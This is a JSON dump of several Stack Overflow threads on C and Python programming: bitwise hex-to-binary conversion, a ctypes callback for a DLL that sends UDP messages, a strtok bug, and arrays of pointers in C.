"Jeremy Pare", "link": "https://stackoverflow.com/users/5043033/jeremy-pare"}, "edited": false, "score": 0, "creation_date": 1524621397, "post_id": 50012718, "comment_id": 87042317, "body": "It is not for an homework but your algorithm works well. :) However I was more looking for a way to do this using only bitwise operators, the loop is pretty simple indeed. I clarified this in my OP."}, {"owner": {"reputation": 42504, "user_id": 1161878, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/0157ddd785dc01e95342e3661d34b42a?s=128&d=identicon&r=PG", "display_name": "Gene", "link": "https://stackoverflow.com/users/1161878/gene"}, "reply_to_user": {"reputation": 177, "user_id": 5043033, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4oerX.jpg?s=128&g=1", "display_name": "Jeremy Pare", "link": "https://stackoverflow.com/users/5043033/jeremy-pare"}, "edited": false, "score": 0, "creation_date": 1524711533, "post_id": 50012718, "comment_id": 87084423, "body": "@JeremyPare Please see the addition. Often, trying to beat the compiler is a bad idea."}], "tags": [], "owner": {"reputation": 42504, "user_id": 1161878, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/0157ddd785dc01e95342e3661d34b42a?s=128&d=identicon&r=PG", "display_name": "Gene", "link": "https://stackoverflow.com/users/1161878/gene"}, "is_accepted": true, "score": 2, "last_activity_date": 1524715748, "last_edit_date": 1524715748, "creation_date": 1524619041, "answer_id": 50012718, "question_id": 50012299, "link": "https://stackoverflow.com/questions/50012299/convert-hexadecimal-made-up-of-0s-and-1s-to-binary-equivalent/50012718#50012718", "title": "Convert hexadecimal made up of 0&#39;s and 1&#39;s to binary equivalent", "body": "<p>This is pretty simple problem, which I assume is homework.  @tom made it a bit harder than it needs to be.</p>\n\n<p>You simply want to extract every 4th bit starting from the least significant, ignoring the 3 intervening zeros. I'll give you an algorithm. Writing the code shouldn't be hard:</p>\n\n<pre><code>let x be the hex coded binary number to convert\nlet val be the binary result value, initially zero\nlet n be the bit position we're currently finding, initially zero\nwhile x is not zero\n  let b be the least significant bit of x\n  update val to be val or (b shifted left by n bits)\n  increment n\n  update x to be x shifted right by 4 bits\n</code></pre>\n\n<p>Here's another approach:</p>\n\n<pre><code>let val be 0\nlet hex_mask be 1\nlet bin_mask be 1\nwhile hex_mask is not zero\n  if (x and hex_mask) is non-zero, then update val to be val or bin_mask\n  shift hex_mask left 4 bits\n  shift bin_mask left 1 bit\n</code></pre>\n\n<p><strong>Addition</strong></p>\n\n<p>Since you say it's not homework, let me show you that the second solution actually <em>is</em> a solution with only bitwise operators if you have a good compiler.</p>\n\n<p>Here's code:</p>\n\n<pre><code>uint16_t hex_coded_binary_value(uint16_t x) {\n  uint16_t val = 0;\n  for (uint16_t h = 1, b = 1; h; h &lt;&lt;=4, b &lt;&lt;= 1)\n    if (x &amp; h) val |= b;\n  return val;\n}\n</code></pre>\n\n<p>If you compile this with a recent version of Apple <code>clang</code>, you'll get:</p>\n\n<pre><code>mov eax, edi\nand eax, 1\nmov ecx, edi\nshr ecx, 3\nand ecx, 2\nor ecx, eax\nmov eax, edi\nshr eax, 6\nand eax, 4\nor eax, ecx\nshr edi, 9\nand edi, 8\nlea eax, [rdi + rax]\nret\n</code></pre>\n\n<p>Note no loops! It's all shift, and, or, add, and move. <code>gcc</code> uses conditional move instructions, but also no loops.</p>\n\n<p>What's the algorithm the compiler has discovered?  If you were coding in C, it would look something like:</p>\n\n<pre><code>val = (x &amp; 1)\n    | ((x &gt;&gt; (4 - 1)) &amp; (1 &lt;&lt; 1))\n    | ((x &gt;&gt; (8 - 2)) &amp; (1 &lt;&lt; 2))\n    | ((x &gt;&gt; (12 - 3)) &amp; (1 &lt;&lt; 3));\n</code></pre>\n\n<p>This folds to</p>\n\n<pre><code>val = (x &amp; 1) | ((x &gt;&gt; 3) &amp; 2) | ((x &gt;&gt; 6) &amp; 4) | ((x &gt;&gt; 9) &amp; 8);\n</code></pre>\n\n<p>Note that the result has fewer operations than @tom's solution.</p>\n\n<p>This also compiles to essentially the same as the original, but the C is longer and more error prone.  The moral is to trust your compiler.</p>\n"}], "owner": {"reputation": 177, "user_id": 5043033, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4oerX.jpg?s=128&g=1", "display_name": "Jeremy Pare", "link": "https://stackoverflow.com/users/5043033/jeremy-pare"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 179, "favorite_count": 0, "accepted_answer_id": 50012718, "answer_count": 2, "score": 1, "last_activity_date": 1524715748, "creation_date": 1524614901, "last_edit_date": 1524624572, "question_id": 50012299, "link": "https://stackoverflow.com/questions/50012299/convert-hexadecimal-made-up-of-0s-and-1s-to-binary-equivalent", "title": "Convert hexadecimal made up of 0&#39;s and 1&#39;s to binary equivalent", "body": "<p>I need a hexadecimal number converted to another one representing the binary value of it (not the actual value though).</p>\n\n<p>For example, if I have 0x0101, I would like to get 0b0101, which means 0x5. The hexadecimal I get at the beginning is always composed of 0's and 1's.</p>\n\n<p>It could also be a way to convert 0xf00f to 0b1001 (0xf's to 0b1's instead of 0x1's to 0b1's), which means 0x9. Actually, the hexadecimal number I have at the beginning is composed of f's and 0's, but it's easy to get the f's replaced by 1's by dividing it by 0xf. Example:</p>\n\n<pre><code>uint16_t bitMask = 0xf0f0;\nuint16_t nybbleMask = 0;\n\n//do some bit manipulation with bitMask\n//get nybbleMask == 0xc (0b1010)\n</code></pre>\n\n<p>or:</p>\n\n<pre><code>bitMask = bitMask / 0xf;\n//bitMask is now 0x1010\n\n//do some bit manipulation with bitmask\n//get nybbleMask == 0xc (0b1010)\n</code></pre>\n\n<p>Edit: I know I could easily do it with a loop, but I was wondering if I could do something equivalent with bitwise opetator. Also, I don't have access to <code>math.h</code> library.</p>\n"}, {"tags": ["python", "c", "ctype"], "answers": [{"tags": [], "owner": {"reputation": 4095, "user_id": 58456, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/c6629c9c729e0ae6973af4e7e22148ff?s=128&d=identicon&r=PG", "display_name": "Steven Smethurst", "link": "https://stackoverflow.com/users/58456/steven-smethurst"}, "is_accepted": true, "score": 1, "last_activity_date": 1524697355, "creation_date": 1524697355, "answer_id": 50032522, "question_id": 50012275, "link": "https://stackoverflow.com/questions/50012275/creating-a-python-callback-for-a-c-function-from-a-dll-with-a-char-buffer/50032522#50032522", "title": "Creating a python callback for a C function from a DLL with a char buffer.", "body": "<p>I figured it out. </p>\n\n<p>in the python SendMessage function I figured out a way to convert the c_void_p to a byte array. </p>\n\n<pre><code># convert the pointer to a buffer. \nbuffer = c_char * length \nmessageToSend = buffer.from_address(message)\n</code></pre>\n"}], "owner": {"reputation": 4095, "user_id": 58456, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/c6629c9c729e0ae6973af4e7e22148ff?s=128&d=identicon&r=PG", "display_name": "Steven Smethurst", "link": "https://stackoverflow.com/users/58456/steven-smethurst"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 382, "favorite_count": 1, "accepted_answer_id": 50032522, "answer_count": 1, "score": 3, "last_activity_date": 1524697355, "creation_date": 1524614645, "question_id": 50012275, "link": "https://stackoverflow.com/questions/50012275/creating-a-python-callback-for-a-c-function-from-a-dll-with-a-char-buffer", "title": "Creating a python callback for a C function from a DLL with a char buffer.", "body": "<p>I am trying to create a python wrapper for a C DLL. The C DLL uses a callbacks to \"send\" messages via UDP from the DLL. </p>\n\n<p>What I expected to happen was that python code would load the DLL library and the two functions. Then it would register the call back with the DLL using the <code>RegisterCallbackSendMessage</code> function. The pointer to the callback would be stored in memory in the DLL memory space. Then the python code would call the SendWhoIs DLL function. This function would create a buffer and use the SendMessage function pointer to send the message from the DLL to the python code. </p>\n\n<p>The issue I am having is that the <code>message</code> parameter in the <code>SendMessage</code> function in python doesn't know how to interpreter a <code>void *</code> and I can not pass this buffer to <code>sock.sendto</code> function. </p>\n\n<p>I get the following error. </p>\n\n<pre><code>sock.sendto(message, (UDP_IP, UDP_PORT))\nTypeError: a bytes-like object is required, not 'int'\n</code></pre>\n\n<p>My question is: How do I convert a c_void_p to a byte array that sock.sendto can accept.? </p>\n\n<p>I have tried to reduce my code as much as possible and still make it understandable. </p>\n\n<p>This is my C code</p>\n\n<pre><code>// C DLL code \n// \n\n#define DllExport extern \"C\" __declspec( dllexport )\n\ntypedef uint16_t(*FPCallbackSendMessage)(const uint8_t * message, const uint32_t length);\nFPCallbackSendMessage g_CallbackSendMessage;\n\nDllExport bool RegisterCallbackSendMessage(uint16_t(*p_CallbackSendMessage)(const uint8_t * message, const uint32_t length)) {\n    g_CallbackSendMessage = p_CallbackSendMessage ; \n    return true;\n}\n\nvoid SendWhoIs(unsigned int dd) {\n    printf(\"dd=%d\", dd); \n    char buffer[500];\n    g_CallbackSendMessage( buffer, 500 ); \n}\n</code></pre>\n\n<p>And this is my python code </p>\n\n<pre><code># Python code \n# =================\nprint(\"Start\") \n\ncustomDLL = cdll.LoadLibrary (\"customeDLL.dll\")\n\ndef SendMessage( message, length ):\n    print(\"SendMessage...\") \n    UDP_IP = \"192.168.1.1\"\n    UDP_PORT = 47808\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.sendto(message, (UDP_IP, UDP_PORT))\n    return True \n\nprint(\"Registering Callback SendMessage...\") \nSendMessageFUNC = CFUNCTYPE(c_bool, c_void_p, c_uint)\nSendMessage_func = SendMessageFUNC( SendMessage )\n\nRegisterCallbackSendMessage = customDLL.RegisterCallbackSendMessage\nRegisterCallbackSendMessage.argtypes = [ SendMessageFUNC ]\nRegisterCallbackSendMessage( SendMessage_func ) \n\nprint(\"Do message...\") \nSendWhoIs = BACnetStackDLL.SendWhoIs\nSendWhoIs.argtypes = [c_uint]\n\nSendWhoIs( 47 )\n\nprint(\"End\") \n</code></pre>\n"}, {"tags": ["c", "string", "token"], "comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1524614281, "post_id": 50012199, "comment_id": 87040838, "body": "We can&#39;t even begin to address this question based on the fragments you&#39;ve presented.  If you want a useful answer then it would behoove you to present a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> that reproduces the problem."}, {"owner": {"reputation": 1793, "user_id": 2368452, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/49f2bbaefe3c6b34dcd2c5a26243ea62?s=128&d=identicon&r=PG", "display_name": "Arnabjyoti Kalita", "link": "https://stackoverflow.com/users/2368452/arnabjyoti-kalita"}, "edited": false, "score": 0, "creation_date": 1524614340, "post_id": 50012199, "comment_id": 87040855, "body": "Can you provide us the entire code fragment that you wrote ?"}], "answers": [{"comments": [{"owner": {"reputation": 289, "user_id": 7090180, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/c13782a4b3dfdd9539ed345c04480237?s=128&d=identicon&r=PG&f=1", "display_name": "rubyquartz", "link": "https://stackoverflow.com/users/7090180/rubyquartz"}, "edited": false, "score": 0, "creation_date": 1524614717, "post_id": 50012276, "comment_id": 87040923, "body": "this completely fixed the issue, I missed a return character- will be accepting in 5 minutes!"}, {"owner": {"reputation": 1253, "user_id": 3596376, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aeldq.jpg?s=128&g=1", "display_name": "tom", "link": "https://stackoverflow.com/users/3596376/tom"}, "reply_to_user": {"reputation": 289, "user_id": 7090180, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/c13782a4b3dfdd9539ed345c04480237?s=128&d=identicon&r=PG&f=1", "display_name": "rubyquartz", "link": "https://stackoverflow.com/users/7090180/rubyquartz"}, "edited": false, "score": 0, "creation_date": 1524614813, "post_id": 50012276, "comment_id": 87040941, "body": "@rubyquartz - glad that this fixed the issue :-)"}], "tags": [], "owner": {"reputation": 1253, "user_id": 3596376, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aeldq.jpg?s=128&g=1", "display_name": "tom", "link": "https://stackoverflow.com/users/3596376/tom"}, "is_accepted": true, "score": 1, "last_activity_date": 1524614646, "creation_date": 1524614646, "answer_id": 50012276, "question_id": 50012199, "link": "https://stackoverflow.com/questions/50012199/reading-tokens-misreading-simple-string-c/50012276#50012276", "title": "reading tokens misreading simple string - c", "body": "<p>Partial answer.</p>\n\n<p>The reason you get the output is that you have a ms-dos (or windows) type <code>.txt</code> file which has two newline characters. You are catching the '\\n'line feed character but not the carriage return character... so your string <code>%s</code> is printing a carriage return. That is why the <code>!</code> is the first character on the line.</p>\n"}], "owner": {"reputation": 289, "user_id": 7090180, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/c13782a4b3dfdd9539ed345c04480237?s=128&d=identicon&r=PG&f=1", "display_name": "rubyquartz", "link": "https://stackoverflow.com/users/7090180/rubyquartz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 31, "favorite_count": 0, "accepted_answer_id": 50012276, "answer_count": 1, "score": 1, "last_activity_date": 1524614646, "creation_date": 1524614061, "last_edit_date": 1524614592, "question_id": 50012199, "link": "https://stackoverflow.com/questions/50012199/reading-tokens-misreading-simple-string-c", "title": "reading tokens misreading simple string - c", "body": "<p>I'm writing a program where I need to read in token by token and detect certain keywords. One of these keywords is \"gt\" which stands for greater than.</p>\n\n<p>I split the text file into tokens by tabs, newlines, spaces, and returns. Buffer is simply a large char array.</p>\n\n<pre><code> char*  word = strtok(buffer, \" \\n\\t\\r\");\n</code></pre>\n\n<p>I then have several cases to check for the possible words.  The gt is as follows.  Weirdly enough, this works for other keywords and sometimes even other occurrences of 'gt'.</p>\n\n<pre><code>//gt\n        if(strcmp(\"gt\", word) == 0){\n            type = GT;\n            literal_value = 0;\n        }\n</code></pre>\n\n<p>However, it isn't getting reached despite a 'gt' being input.  I noticed that when I print, this happens</p>\n\n<pre><code>printf(\"WORD is %s!\\n\", word);\n\nPRINTS \"!ORD is gt\"\n</code></pre>\n\n<p>Which clearly isn't right.  If the answer is something obvious please let me know- this bug has been evading me for a long time!</p>\n\n<p>updated fragment:</p>\n\n<pre><code>char * word = strtok(buffer, \" \\n\\t\\r\");\n\n    while (word != NULL){\n        printf(\"word is %s!\\n\", sections);     //PRINTS \"!ORD is gt\"\n\n        if(sections[0] == ';'){\n            break;              //comment indicated by ';'\n        }\n\n        //gt\n        if(strcmp(\"gt\", word) == 0){\n            type = GT;\n            literal_value = 0;\n        }\n          //...............\n         //other comparisons for less than, equal to\n\n        process(&amp;curr, output_file);   //function to process current token\n        word = strtok(NULL, \" \\n\\t\\r\");\n        }\n</code></pre>\n"}, {"tags": ["c", "arrays", "pointers"], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 8798408, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QVVZoTvahhY/AAAAAAAAAAI/AAAAAAAAAHc/5lOUHIqjzqA/photo.jpg?sz=128", "display_name": "helper ask help", "link": "https://stackoverflow.com/users/8798408/helper-ask-help"}, "edited": false, "score": 0, "creation_date": 1524612530, "post_id": 50012007, "comment_id": 87040466, "body": "Thanks but can you explain what void** array means?"}, {"owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "reply_to_user": {"reputation": 31, "user_id": 8798408, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QVVZoTvahhY/AAAAAAAAAAI/AAAAAAAAAHc/5lOUHIqjzqA/photo.jpg?sz=128", "display_name": "helper ask help", "link": "https://stackoverflow.com/users/8798408/helper-ask-help"}, "edited": false, "score": 0, "creation_date": 1524612590, "post_id": 50012007, "comment_id": 87040479, "body": "work it out from a knowledge of what <code>void*</code> means, that means pointer to anything"}, {"owner": {"reputation": 31, "user_id": 8798408, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QVVZoTvahhY/AAAAAAAAAAI/AAAAAAAAAHc/5lOUHIqjzqA/photo.jpg?sz=128", "display_name": "helper ask help", "link": "https://stackoverflow.com/users/8798408/helper-ask-help"}, "edited": false, "score": 0, "creation_date": 1524613097, "post_id": 50012007, "comment_id": 87040586, "body": "So basically (void*) (<i>array) void</i> is pointer to anything and *array is array of pointers?"}, {"owner": {"reputation": 4217, "user_id": 9614249, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eJfci.png?s=128&g=1", "display_name": "Increasingly Idiotic", "link": "https://stackoverflow.com/users/9614249/increasingly-idiotic"}, "edited": false, "score": 0, "creation_date": 1524614304, "post_id": 50012007, "comment_id": 87040841, "body": "This doesn&#39;t match what is being asked. The question gives a 3D array as an example (<code>int** arr[5]</code>) and asks how to dynamically allocate it.  This answer shows how to statically initialize a 2D array."}], "tags": [], "owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "is_accepted": false, "score": 1, "last_activity_date": 1524612538, "last_edit_date": 1524612538, "creation_date": 1524612444, "answer_id": 50012007, "question_id": 50011963, "link": "https://stackoverflow.com/questions/50011963/how-do-you-create-an-array-of-pointers-in-c/50012007#50012007", "title": "How do you create an array of pointers in C?", "body": "<p>An array of pointers to ints;</p>\n\n<pre><code>int x = 1;\nint y = 42;\nint z = 12;\n\nint * array[3];\n\narray[0] = &amp;x;\narray[1] = &amp;y;\narray[2] = &amp;z;\n</code></pre>\n\n<p>alternate syntax</p>\n\n<pre><code>int * array[] = {&amp;x,&amp;y,&amp;z};\n</code></pre>\n\n<p>keeping it simple. Work upwards from there</p>\n"}, {"comments": [{"owner": {"reputation": 65594, "user_id": 459640, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/bc790307b3c4cdbd25f582d9067651f1?s=128&d=identicon&r=PG", "display_name": "aschepler", "link": "https://stackoverflow.com/users/459640/aschepler"}, "edited": false, "score": 0, "creation_date": 1524618054, "post_id": 50012030, "comment_id": 87041584, "body": "<code>new int**[dimensions]</code> and similar are not valid C."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1524620635, "post_id": 50012030, "comment_id": 87042152, "body": "<code>int***</code> has nothing to do with an &quot;Array&quot;, it is a <i>pointer-to-pointer-to-pointer-to-int</i>. See <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.5.2.1\" rel=\"nofollow noreferrer\">C11 Standard - 6.5.2.1 Array subscripting</a> and <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.7.6.2\" rel=\"nofollow noreferrer\">C11 Standard - 6.7.6.2 Array declarators</a>"}], "tags": [], "owner": {"reputation": 4217, "user_id": 9614249, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eJfci.png?s=128&g=1", "display_name": "Increasingly Idiotic", "link": "https://stackoverflow.com/users/9614249/increasingly-idiotic"}, "is_accepted": false, "score": 1, "last_activity_date": 1524618307, "last_edit_date": 1524618307, "creation_date": 1524612601, "answer_id": 50012030, "question_id": 50011963, "link": "https://stackoverflow.com/questions/50011963/how-do-you-create-an-array-of-pointers-in-c/50012030#50012030", "title": "How do you create an array of pointers in C?", "body": "<blockquote>\n  <p>How do I create an array of pointers where each element holds a pointer to some other value</p>\n</blockquote>\n\n<p>An array of arrays can be though of as a 3D matrix</p>\n\n<pre><code>int*** arr;    // Points to an array of arrays (3 Dimensions)\nint** arr[0];  // Points to an array           (2 Dimensions)\nint* arr[0][0];// Points to a single element   (1 Dimension)\n</code></pre>\n\n<p>If you know the size before hand you can initialize a 3D array like this:</p>\n\n<pre><code>int arr[2][2][2] = {\n   { {1, 2}, {3, 4} },\n   { {5, 6}, {7, 8} },\n}\n</code></pre>\n\n<p>But its not very readable for non trivial n-dimensional arrays. Another approach is to loop over each dimension.</p>\n\n<pre><code>int*** arr;\nint dimensions = 10;\n\narr = malloc(dimensions * sizeof(int**)); // Allocate an array of 2D arrays\n\nfor (int i = 0; i &lt; dimensions; i++) {\n  arr[i] = malloc(dimensions * sizeof(int*)); // Allocate an array of arrays \n\n  for (int j = 0; j &lt; dimensions; j++) {\n      arr[i][j] = malloc(dimensions * sizeof(int)); // Allocate array\n\n      for (int k = 0; k &lt; dimensions; k++) {\n          arr[i][j][k] = 0; // Fill each element with 0's\n      }\n  }\n}\n</code></pre>\n\n<p>This approach also lets to dynamically allocate the arrays.</p>\n\n<blockquote>\n  <p>And what it means to have an array type of void? like void **newArray[5];</p>\n</blockquote>\n\n<p><code>void*</code> is a pointer to an unknown type. If <code>int*</code> means a pointer to an int, <code>void*</code> means a pointer to a value who's type is unknown.</p>\n"}, {"tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": false, "score": 2, "last_activity_date": 1524624435, "creation_date": 1524624435, "answer_id": 50013322, "question_id": 50011963, "link": "https://stackoverflow.com/questions/50011963/how-do-you-create-an-array-of-pointers-in-c/50013322#50013322", "title": "How do you create an array of pointers in C?", "body": "<blockquote>\n  <p><strong>How do you create an array of pointers in C?</strong></p>\n</blockquote>\n\n<p>To create an array of pointers in C, you have one option, you declare:</p>\n\n<pre><code>  type *array[CONST];  /* create CONST number of pointers to type */\n</code></pre>\n\n<p>With C99+ you can create a <em>Variable Length Array</em> (VLA) of pointers, e.g.</p>\n\n<pre><code>  type *array[var];   /* create var number of pointers to type */\n</code></pre>\n\n<p>The standard defines both in <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.7.6.2\" rel=\"nofollow noreferrer\">C11 Standard - 6.7.6.2 Array declarators</a> and discusses subscripting in <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.5.2.1\" rel=\"nofollow noreferrer\">C11 Standard - 6.5.2.1 Array subscripting</a>.</p>\n\n<p>A short example using an array of pointers, assigning a pointer to each row in a 2D array to an array of pointers to <code>int</code>, e.g.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define COL 3\n#define MAX 5\n\nint main (void) {\n\n    int arr2d[MAX][COL] = {{ 0 }},  /* simple 2D array */\n        *arr[MAX] = { NULL },       /* 5 pointers to int */\n        i, j, v = 0;\n\n    for (i = 0; i &lt; MAX; i++) {     /* fill 2D array */\n        for (j = 0; j &lt; COL; j++)\n            arr2d[i][j] = v++;\n        arr[i] = arr2d[i];          /* assing row-pointer to arr */\n    }\n\n    for (i = 0; i &lt; MAX; i++) {     /* for each pointer */\n        for (j = 0; j &lt; COL; j++)   /* output COL ints */\n            printf (\" %4d\", arr[i][j]);\n        putchar ('\\n');\n    }\n}\n</code></pre>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>$ ./bin/array_ptr2int_vla\n    0    1    2\n    3    4    5\n    6    7    8\n    9   10   11\n   12   13   14\n</code></pre>\n\n<p>Another fundamental of C is the <em>pointer-to-pointer</em>, but it is not an \"Array\", though it is routinely called a \"dynamic array\" and can be allocated and indexed simulating an array. The distinction between an \"Array\" and a collection of pointers is that with an Array, all values are guaranteed to be sequential in memory -- there is no such guarantee with a collection of pointers and the memory locations they reference.</p>\n\n<p><strong>So What Does <code>int **arr[CONST]</code> Declare?</strong></p>\n\n<p>In your question you posit a declaration of  <code>int** arr[5] = {0xbfjeabfbfe,0x...};</code>, so what does that declare? You are declaring Five of something, but what? You are declaring five <em>pointer-to-pointer-to-int</em>. Can you do that? Sure.</p>\n\n<p>So what do you do with a <em>pointer-to-pointer-to-something</em>? The pointer-to-poitner forms the backbone of dynamically allocated and reallocated collection of types. They are commonly termed \"dynamically allocated arrays\", but that is somewhat a misnomer, because there is no guarantee that all values will be <em>sequential</em> in memory. You will declare a given number of pointers to each <code>int**</code> in the array. You do not have to allocate an equal number of pointers. </p>\n\n<p>(<strong>note:</strong> there is no guarantee that the memory pointed to by the pointers will even be sequential, though the pointers themselves will be -- make sure you understand this distinction and what an \"Array\" guarantees and what pointers don't)</p>\n\n<p><code>int** arr[5]</code> declares five <code>int**</code>. You are then free to assign any address to you like to each of the five pointers, as long as the type is <code>int**</code>. For example, you will allocate for your pointers with something similar to:</p>\n\n<pre><code>  arr[i] = calloc (ROW, sizeof *arr[i]);  /* allocates ROW number of pointers */\n</code></pre>\n\n<p>Then you are free to allocate any number of <code>int</code> and assign that address to each pointer, e.g.</p>\n\n<pre><code>  arr[i][j] = calloc (COL, sizeof *arr[i][j]); /* allocates COL ints */\n</code></pre>\n\n<p>You can then loop over the integers assigning values:</p>\n\n<pre><code>  arr[i][j][k] = v++;\n</code></pre>\n\n<p>A short example using your <code>int** arr[5]</code> type allocation could be similar to:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define ROW 3\n#define COL ROW\n#define MAX 5\n\nint main (void) {\n\n    int **arr[MAX] = { NULL },  /* 5 pointer-to-pointer-to-int */\n        i, j, k, v = 0;\n\n    for (i = 0; i &lt; MAX; i++) { /* allocate ROW pointers to each */\n        if ((arr[i] = calloc (ROW, sizeof *arr[i])) == NULL) {\n            perror (\"calloc - pointers\");\n            return 1;\n        }\n        for (j = 0; j &lt; ROW; j++) { /* allocate COL ints each pointer */\n            if ((arr[i][j] = calloc (COL, sizeof *arr[i][j])) == NULL) {\n                perror (\"calloc - integers\");\n                return 1;\n            }\n            for (k = 0; k &lt; COL; k++)   /* assign values to ints */\n                arr[i][j][k] = v++;\n        }\n    }\n\n    for (i = 0; i &lt; MAX; i++) { /* output each pointer-to-pointer to int */\n        printf (\"pointer-to-pointer-to-int: %d\\n\\n\", i);\n        for (j = 0; j &lt; ROW; j++) {     /* for each allocated pointer */\n            for (k = 0; k &lt; COL; k++)   /* output COL ints */\n                printf (\"  %4d\", arr[i][j][k]);\n            free (arr[i][j]);   /* free the ints */\n            putchar ('\\n');\n        }\n        free (arr[i]);      /* free the pointer */\n        putchar ('\\n');\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>You have allocated for five simulated 2D arrays assigning the pointer to each to your array of <code>int **arr[5]</code>, the output would be:</p>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>$ ./bin/array_ptr2ptr2int\npointer-to-pointer-to-int: 0\n\n     0     1     2\n     3     4     5\n     6     7     8\n\npointer-to-pointer-to-int: 1\n\n     9    10    11\n    12    13    14\n    15    16    17\n\npointer-to-pointer-to-int: 2\n\n    18    19    20\n    21    22    23\n    24    25    26\n\npointer-to-pointer-to-int: 3\n\n    27    28    29\n    30    31    32\n    33    34    35\n\npointer-to-pointer-to-int: 4\n\n    36    37    38\n    39    40    41\n    42    43    44\n</code></pre>\n\n<p>Hopefully this has helped with the distinction between an array of pointers, and an array of pointers-to-pointer and shown how to declare and use each. If you have any further questions, don't hesitate to ask.</p>\n"}], "owner": {"reputation": 31, "user_id": 8798408, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QVVZoTvahhY/AAAAAAAAAAI/AAAAAAAAAHc/5lOUHIqjzqA/photo.jpg?sz=128", "display_name": "helper ask help", "link": "https://stackoverflow.com/users/8798408/helper-ask-help"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 903, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1524624435, "creation_date": 1524612018, "last_edit_date": 1524612422, "question_id": 50011963, "link": "https://stackoverflow.com/questions/50011963/how-do-you-create-an-array-of-pointers-in-c", "title": "How do you create an array of pointers in C?", "body": "<p>How do I create an array of pointers where each element holds a pointer to some other value</p>\n\n<p>For example if I have </p>\n\n<pre><code>int** arr[5] = {0xbfjeabfbfe,0x...}; //is it the right way to do it?\n</code></pre>\n\n<p>And what it means to have an array type of <code>void</code>? like <code>void **newArray[5];</code></p>\n\n<p>And let's say I want to dynamically allocate memory for an array of pointers using malloc or calloc!! What will be the syntax be?</p>\n"}, {"tags": ["c", "assembly", "x86-64"], "comments": [{"owner": {"reputation": 2928, "user_id": 5927758, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/QmcMj.png?s=128&g=1", "display_name": "Mitch", "link": "https://stackoverflow.com/users/5927758/mitch"}, "edited": false, "score": 0, "creation_date": 1524610025, "post_id": 50011697, "comment_id": 87039835, "body": "Yes if you&#39;re using a 64bit architecture addresses must be 64 bits in length."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 1, "creation_date": 1524610132, "post_id": 50011697, "comment_id": 87039869, "body": "<code>movb $0xf, (%ebx)</code> is correct.  You just need an address size override to use it.  Does your assembler perhaps not support this?"}, {"owner": {"reputation": 53, "user_id": 7911562, "user_type": "registered", "profile_image": 